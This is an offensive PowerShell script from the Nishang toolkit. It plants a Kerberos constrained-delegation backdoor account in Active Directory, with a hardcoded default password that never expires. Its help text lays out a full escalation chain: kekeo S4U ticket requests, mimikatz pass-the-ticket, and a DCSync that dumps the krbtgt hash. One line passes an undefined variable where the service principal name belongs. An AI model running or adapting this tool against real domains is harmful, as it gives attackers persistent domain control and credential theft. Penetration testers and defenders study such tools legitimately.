function ConstrainedDelegation-Backdoor
{
<#
.SYNOPSIS
Nishang Script which could add constrained delegation backdoor service accounts or add constrained delegation backdoor functionality to existing service accounts.

.DESCRIPTION
This script will add a new service account which is allowed to delegate to some exploitable services, e.g ldap/DC.LAB.LOCAL.
Attackers can use this backdoor service account to get TGS of ldap/DC.LAB.LOCAL through s4u2self and s4u2proxy protocol.

Attack example:
kekeo.exe "tgt::ask /user:backdoor_svc /domain:lab.local /password:d1ive@Dubhe" exit
kekeo.exe "tgs::s4u /tgt:TGT_backdoor_svc@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:ldap/DC.lab.local" exit
mimikatz.exe "kerberos::ptt TGS_Administrator@lab.local@LAB.LOCAL_ldap~DC2.lab.local@LAB.LOCAL.kirbi" exit
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:lab.local" exit

This script needs to be executed from a shell with domain administrator privileges.

.PARAMETER Name
Service account name

.PARAMETER SamAccountName
Service sam account name

.PARAMETER Password
Password of the backdoor service account 

.PARAMETER DomainName
Current domain name

.PARAMETER ServicePrincipalName
Backdoor service principal name

.PARAMETER AllowedToDelegateTo
Principle Name of the service which the backdoor service account is allowed to delegate to 

.EXAMPLE
PS > ConstrainedDelegation-Backdoor -SamAccountName backdoor -Password d1ive@Dubhe -DomainName lab.local -AllowedToDelegateTo ldap/DC.lab.local
Use above command to create a new backdoor service account named "backdoor"

.EXAMPLE
PS > ConstrainedDelegation-Backdoor -SamAccountName iis_svc -DomainName lab.local -AllowedToDelegateTo ldap/DC.lab.local
Use above command to add backdoor functionality to the iis_svc service account. 
It should be noted that the attacker needs to know the password of iis_svc.

.LINK
https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/
#>
    
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Name,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $SamAccountName,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $UserPrincipalName,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $Password,

        [Parameter(Position = 4, Mandatory = $True)]
        [String]
        $DomainName,

        [Parameter(Position = 5, Mandatory = $False)]
        [String]
        $ServicePrincipalName,

        [Parameter(Position = 6, Mandatory = $True)]
        [String]
        $AllowedToDelegateTo
    )

    if (!$Name) {
        $Name = $SamAccountName
    }

    if (!$UserPrincipalName) {
        $UserPrincipalName = $SamAccountName + "@" + $DomainName
    }

    if (!$ServicePrincipalName) {
        $ServicePrincipalName = $SamAccountName + "/" + $DomainName
    }

    if (!$Password) {
        $Password = "d1ive@Dubhe"
    }
    
    Try {
        $user = Get-ADUser $SamAccountName -Properties "msDS-AllowedToDelegateTo"
        Write-Host "SamAccountName '$SamAccountName' already exists. Add 'msDS-AllowedToDelegateTo $AllowedToDelegateTo' to '$SamAccountName'."
    } Catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
        New-ADUser -Name "$Name" -SamAccountName $SamAccountName -UserPrincipalName $UserPrincipalName -ServicePrincipalNames "$SPN" -AccountPassword (convertto-securestring "$Password" -asplaintext -force)  -PasswordNeverExpires $True  -PassThru | Enable-ADAccount
        $user = Get-ADUser $SamAccountName -Properties "msDS-AllowedToDelegateTo"
    }
    Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @( "$AllowedToDelegateTo" ) }
    Set-ADAccountControl $user -TrustedToAuthForDelegation $true
}

